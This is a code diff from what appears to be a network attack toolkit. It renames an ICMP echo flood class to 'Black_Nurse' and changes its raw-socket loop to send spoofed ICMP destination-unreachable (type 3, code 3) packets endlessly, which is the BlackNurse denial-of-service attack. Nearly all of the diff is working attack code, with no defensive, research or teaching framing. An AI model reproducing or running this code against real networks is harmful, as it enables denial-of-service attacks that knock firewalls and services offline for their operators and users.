@@ -6,23 +6,27 @@
 #include <netinet/ip_icmp.h>
 #include <csignal>
 
-#include "ICMP_Flood.hpp"
+#include "Black_Nurse.hpp"
 #include "Randomizer.hpp"
 
-void ICMP_Flood::attack(const int *id) {
+Black_Nurse::Black_Nurse(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
+
+}
+
+void Black_Nurse::attack(const int *id) {
     int r;
+    char buf[400];
     std::vector<int> sockets;
     for (int x = 0; x < conf->CONNECTIONS; x++) {
         sockets.push_back(0);
     }
-    char buf[400];
     std::string message{};
     // Structs
     auto *ip = (struct iphdr *)buf;
     auto *icmp = (struct icmphdr *)(ip + 1);
     struct hostent *hp;
     struct sockaddr_in dst{};
-    signal(SIGPIPE, &ICMP_Flood::broke);
+    signal(SIGPIPE, &Black_Nurse::broke);
     while(true){
         for(int x = 0;x < conf->CONNECTIONS; x++){
             bzero(buf, sizeof(buf));
@@ -56,8 +60,8 @@ void ICMP_Flood::attack(const int *id) {
             dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
 
-            icmp->type = ICMP_ECHO;
-            icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 1000));
+            icmp->type = ICMP_DEST_UNREACH;
+            icmp->code = static_cast<u_int8_t>(3);
             icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
             icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
             icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
@@ -76,8 +80,4 @@ void ICMP_Flood::attack(const int *id) {
         logger->Log(&message, Logger::Info);
         usleep(static_cast<__useconds_t>(conf->delay));
     }
-}
-
-ICMP_Flood::ICMP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
-
 }
